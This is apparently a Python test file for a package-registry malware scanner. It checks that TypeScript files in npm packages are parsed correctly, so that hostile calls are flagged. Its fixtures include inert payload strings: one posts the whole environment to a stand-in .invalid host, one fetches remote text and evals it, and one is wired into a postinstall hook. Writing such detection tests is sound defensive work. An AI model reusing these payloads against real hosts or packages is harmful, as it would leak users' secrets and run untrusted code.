"""TS-STRIP (0.1.9, rule set 2.93.0): a release's TypeScript members are read in their own dialect.

The registry handed the engine a .ts, .tsx, .mts or .cts member's text alone, as JavaScript, and the supply-chain
tree read it as JavaScript first: `post<object>(url, process.env)`, a call given a type, was `(post < object) >
(url, process.env)`, no call and no refusal, and the import-time, use-time and install-script tests found nothing in
code whose twin without the type is CRITICAL. Each pass now gives the engine the member's dialect, from its name
(tests/scanner/test_typescript_dialect.py has the engine's side; SC-UNPARSED-CODE's words are in
test_unparsed_code.py).

Payloads are inert: hosts are .invalid, nothing is installed or run.
"""
import unittest

from tests.registry._review_support import issues, manifest, scan_npm

# the whole environment sent, and code received run, each in a call given a type
SEND = "import axios from 'axios';\naxios.post<Resp>('https://x.invalid/c', process.env);\n"
SEND_PLAIN = "import axios from 'axios';\naxios.post('https://x.invalid/c', process.env);\n"
RUN = ("function getJSON<T>(u: string) { return fetch(u).then((r) => r.text()); }\n"
       "export function load() { return getJSON<string>('https://x.invalid/p').then(eval); }\n")


def found(res, rule):
    return [(i["file"], i["sev"]) for i in issues(res, rule)]


class TypeScriptMemberTests(unittest.TestCase):
    def test_an_entry_point(self):
        for main in ("index.ts", "index.mts", "index.cts", "index.tsx"):
            with self.subTest(main):
                res = scan_npm({"package.json": manifest(main=main), main: SEND})
                self.assertEqual(found(res, "SC-IMPORT-RISK"), [(main, "CRITICAL")])
                self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
        # its twin without the type was found already; in a JavaScript file `a<b>(c)` stays two comparisons
        res = scan_npm({"package.json": manifest(main="index.ts"), "index.ts": SEND_PLAIN})
        self.assertEqual(found(res, "SC-IMPORT-RISK"), [("index.ts", "CRITICAL")])
        res = scan_npm({"package.json": manifest(main="index.js"), "index.js": SEND})
        self.assertEqual(found(res, "SC-IMPORT-RISK"), [])

    def test_a_file_the_package_runs_when_used(self):
        res = scan_npm({"package.json": manifest(main="index.js"), "index.js": "module.exports = 1;\n",
                        "lib/load.ts": RUN})
        self.assertEqual(found(res, "SC-USE-RISK"), [("lib/load.ts", "CRITICAL")])

    def test_an_install_script(self):
        res = scan_npm({"package.json": manifest(scripts={"postinstall": "node scripts/setup.ts"}),
                        "scripts/setup.ts": SEND})
        hook = issues(res, "SC-INSTALL-HOOK")
        self.assertEqual([i["sev"] for i in hook], ["CRITICAL"])
        self.assertEqual(hook[0]["msg"], "Install hook runs scripts/setup.ts, which sends environment variables over "
                                         "the network (the whole environment).")

    def test_vites_entry_point_is_read(self):
        # a .tsx file with TypeScript's syntax: refused by both earlier readings ("2 JavaScript files the parser
        # could not read"), read now
        main = ("import React from 'react'\nimport ReactDOM from 'react-dom/client'\nimport App from './App.tsx'\n"
                "ReactDOM.createRoot(document.getElementById('root')!).render(\n  <React.StrictMode>\n    <App />\n"
                "  </React.StrictMode>,\n)\n")
        app = ("import { useState } from 'react'\nexport default function App() {\n"
               "  const [items, setItems] = useState<number[]>([])\n"
               "  return <button onClick={() => setItems([...items, 1])}>{items.length as number}</button>\n}\n")
        res = scan_npm({"package.json": manifest(main="src/main.tsx"), "src/main.tsx": main, "src/App.tsx": app})
        self.assertEqual(issues(res, "SC-UNPARSED-CODE"), [])
        self.assertEqual(res["verdict"], "OK", res["verdictReason"])


if __name__ == "__main__":
    unittest.main()
